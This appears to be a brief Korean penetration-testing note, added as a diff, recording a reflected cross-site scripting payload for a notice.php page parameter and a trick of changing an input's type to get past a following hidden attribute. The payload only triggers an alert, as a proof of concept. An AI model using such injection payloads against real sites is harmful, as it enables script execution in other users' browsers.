@@ -1,0 +1,5 @@
+notice.php 사이트 접근 시
+
+pageIndex=1"+type="search"+onmouseover="alert('XSS')
+
+hidden속성이 뒤에 존재할 경우 Type을 변경하여 우회
